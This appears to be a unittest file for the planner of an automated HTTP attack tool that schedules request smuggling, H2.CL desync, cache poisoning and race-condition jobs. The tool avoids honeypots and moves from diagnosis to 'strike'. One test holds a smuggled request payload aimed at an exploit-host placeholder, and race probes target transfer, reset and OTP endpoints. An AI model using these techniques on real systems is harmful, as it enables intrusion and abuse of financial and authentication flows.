#!/usr/bin/env python3
import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import planner  # noqa: E402
from research.knowledge_base import add_universal_key  # noqa: E402


class TestPlanner(unittest.TestCase):
    def test_excludes_honeypot_and_high_deception(self):
        targets = [
            {"target": "a.example.com", "is_honeypot": True, "deception_risk": "high", "tech": ["Nginx"], "cache_headers": {"x-cache": "HIT"}},
            {"target": "b.example.com", "is_honeypot": False, "deception_risk": "high", "tech": ["Nginx"]},
            {"target": "c.example.com", "is_honeypot": False, "deception_risk": "low", "tech": ["Nginx"], "cache_headers": {"age": "1"}, "known_ports": [443]},
        ]
        cfg = planner.build_daemon_config(targets)
        hosts = cfg["generated_scope"]["allow_hosts"]
        self.assertNotIn("a.example.com", hosts)
        self.assertNotIn("b.example.com", hosts)
        self.assertIn("c.example.com", hosts)

    def test_cache_headers_h2_generates_h2_tunnel(self):
        t = {
            "target": "cache.example.com",
            "is_honeypot": False,
            "deception_risk": "low",
            "tech": ["Cloudflare", "Nginx"],
            "cache_headers": {"cf-cache-status": "HIT", "age": "10"},
            "known_ports": [443],
            "baseline": {"status_code": 200, "content_length": 100, "words": 10, "lines": 5, "title_hash": "abc"},
        }
        jobs = planner.plan_target(t)
        probes = [j["probe"] for j in jobs]
        self.assertIn("h2-tunnel", probes)
        jt = next(j for j in jobs if j["probe"] == "h2-tunnel")
        self.assertEqual(jt["success_finding"], "cache_poisoned")
        self.assertEqual(jt["tls"], "h2")
        self.assertEqual(jt["metadata"]["baseline"]["status_code"], 200)

    def test_reverse_proxy_generates_smuggle(self):
        t = {
            "target": "rp.example.com",
            "is_honeypot": False,
            "deception_risk": "low",
            "tech": ["Nginx", "HAProxy"],
            "cache_headers": {},
            "known_ports": [443],
        }
        jobs = planner.plan_target(t)
        probes = [j["probe"] for j in jobs]
        self.assertIn("smuggle-chain", probes)
        self.assertTrue(any(j["probe"] == "smuggle" and j.get("variant") == "h2-downgrade" for j in jobs))

    def test_critical_endpoints_generate_h2race_limited(self):
        t = {
            "target": "api.example.com",
            "is_honeypot": False,
            "deception_risk": "low",
            "tech": ["Envoy"],
            "cache_headers": {},
            "known_ports": [443],
            "critical_endpoints": ["/api/v1/transfer", "/api/v1/reset", "/api/v1/otp", "/api/v1/extra"],
        }
        jobs = planner.plan_target(t)
        races = [j for j in jobs if j["probe"] == "h2race"]
        self.assertEqual(len(races), 3)  # limited to 3
        self.assertTrue(all(j["attempts"] == 1 for j in races))
        self.assertTrue(all(j["until_success"] is False for j in races))

    def test_scope_fail_closed_only_selected(self):
        targets = [
            {"target": "good.example.com", "is_honeypot": False, "deception_risk": "low", "tech": ["Nginx"], "cache_headers": {"age": "1"}},
            {"target": "no-signal.example.com", "is_honeypot": False, "deception_risk": "low", "tech": ["Unknown"], "cache_headers": {}},
        ]
        cfg = planner.build_daemon_config(targets)
        allow = cfg["generated_scope"]["allow_hosts"]
        self.assertIn("good.example.com", allow)
        self.assertNotIn("no-signal.example.com", allow)

    def test_adaptive_mode_generates_compact_diagnostics(self):
        target = {
            "target": "edge.example.com",
            "is_honeypot": False,
            "deception_risk": "low",
            "tech": ["Cloudflare", "Nginx"],
            "cache_headers": {"x-cache": "HIT"},
            "known_ports": [443],
        }
        cfg = planner.build_daemon_config([target], adaptive=True)
        self.assertEqual(cfg["adaptive"]["mode"], "diagnostic")
        self.assertLessEqual(len(cfg["jobs"]), 7)
        actions = [j["metadata"]["adaptive"]["action"] for j in cfg["jobs"]]
        self.assertIn("framing", actions)
        self.assertIn("unkeyed", actions)

    def test_adaptive_telemetry_strikes_confirmed_syndrome(self):
        target = {
            "target": "edge.example.com",
            "is_honeypot": False,
            "deception_risk": "low",
            "tech": ["Cloudflare", "Nginx"],
            "known_ports": [443],
        }
        telemetry = {
            "edge.example.com": {
                "actions": {"framing": False, "h2": False, "upgrade": False, "cache": True, "unkeyed": False},
                "observation": {"status": 200, "close_type": "KEEPALIVE", "headers": {"X-Cache": "HIT", "CF-Ray": "abc"}, "body": "cached"},
            }
        }
        cfg = planner.build_daemon_config([target], adaptive=True, adaptive_telemetry=telemetry, adaptive_min_posterior=0.5)
        self.assertEqual(cfg["adaptive"]["mode"], "strike")
        self.assertEqual(len(cfg["jobs"]), 1)
        self.assertEqual(cfg["jobs"][0]["metadata"]["adaptive"]["action"], "strike")

    def test_adaptive_mode_uses_learned_weights_with_autonomous_provenance(self):
        from research.self_learning import ExperienceLearner, local_simulations

        with tempfile.TemporaryDirectory() as tmp:
            weights_path = os.path.join(tmp, "learned_weights.json")
            with open(weights_path, "w", encoding="utf-8") as handle:
                json.dump(ExperienceLearner().fit(local_simulations()), handle)
            target = {
                "target": "lab.example.test",
                "is_honeypot": False,
                "deception_risk": "low",
                "tech": ["h2"],
                "exploit_host": "exploit.example.test",
                "known_ports": [443],
            }
            cfg = planner.build_daemon_config(
                [target],
                adaptive=True,
                learned_weights=weights_path,
                learned_max_hypotheses=1,
            )

        inferred = [
            j for j in cfg["jobs"]
            if j.get("metadata", {}).get("provenance") == "autonomous-inferred"
        ]
        self.assertEqual(len(inferred), 1)
        job = inferred[0]
        self.assertEqual(job["probe"], "h2-cl")
        self.assertEqual(job["tls"], "h2")
        self.assertIn("GET /resources HTTP/1.1", job["body"])
        self.assertIn("Content-Length: 5", job["body"])
        self.assertNotIn("solution-derived", json.dumps(job))
        summary = cfg["adaptive"]["autonomous_inference"]["targets"][0]
        self.assertEqual(summary["parameters"][0]["smuggled_path"], "/resources")

    def test_h2_cl_playbook_skipped_without_exploit_host(self):
        vault = {"version": 1, "keys": []}
        add_universal_key(
            vault,
            raw_payload=b"GET /resources HTTP/1.1\r\nHost: {{EXPLOIT_HOST}}\r\n\r\n",
            mutation_type="playbook:h2-cl-resources-redirect",
            protocol_edge="h2->h1.1",
            tech_stack=["h2"],
            technique="h2-cl",
            tls="h2",
            job_overrides={
                "probe": "h2-cl",
                "tls": "h2",
                "body": "GET /resources HTTP/1.1\r\nHost: {{EXPLOIT_HOST}}\r\nContent-Length: 5\r\n\r\nx=1",
                "skip_victim": False,
            },
        )
        target = {
            "target": "edge.example.com",
            "known_ports": [443],
            "tech": ["nginx", "h2"],
            "is_honeypot": False,
            "deception_risk": "low",
        }
        jobs = planner.plan_target(target, vault=vault)
        self.assertNotIn("h2-cl", [j["probe"] for j in jobs])


if __name__ == "__main__":
    unittest.main(verbosity=2)